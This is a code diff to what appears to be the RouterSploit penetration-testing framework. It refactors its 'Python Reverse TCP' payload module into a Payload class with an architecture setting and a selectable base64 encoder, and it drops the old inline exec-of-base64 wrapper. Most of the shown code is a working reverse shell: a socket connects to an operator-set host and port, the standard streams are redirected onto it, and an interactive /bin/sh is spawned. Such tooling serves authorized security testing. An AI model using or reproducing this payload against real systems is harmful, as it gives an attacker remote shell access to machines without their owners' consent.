@@ -1,8 +1,13 @@
-from base64 import b64encode
-from routersploit.core.exploit.payloads import GenericPayload, ReverseTCPPayloadMixin
+from routersploit.core.exploit.option import OptString
+from routersploit.core.exploit.payloads import (
+    GenericPayload,
+    Architectures,
+    ReverseTCPPayloadMixin,
+)
+from routersploit.modules.encoders.python.base64 import Encoder
 
 
-class Exploit(ReverseTCPPayloadMixin, GenericPayload):
+class Payload(ReverseTCPPayloadMixin, GenericPayload):
     __info__ = {
         "name": "Python Reverse TCP",
         "description": "Creates interactive tcp reverse shell by using python.",
@@ -11,8 +16,11 @@ class Exploit(ReverseTCPPayloadMixin, GenericPayload):
         ),
     }
 
+    architecture = Architectures.PYTHON
+    encoder = OptString(Encoder(), "Encoder")
+
     def generate(self):
-        payload = (
+        return (
             "import socket,subprocess,os\n" +
             "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" +
             "s.connect(('{}',{}))\n".format(self.lhost, self.lport) +
@@ -21,6 +29,3 @@ class Exploit(ReverseTCPPayloadMixin, GenericPayload):
             "os.dup2(s.fileno(),2)\n" +
             "p=subprocess.call([\"/bin/sh\",\"-i\"])"
         )
-
-        encoded_payload = str(b64encode(bytes(payload, "utf-8")), "utf-8")
-        return "exec('{}'.decode('base64'))".format(encoded_payload)
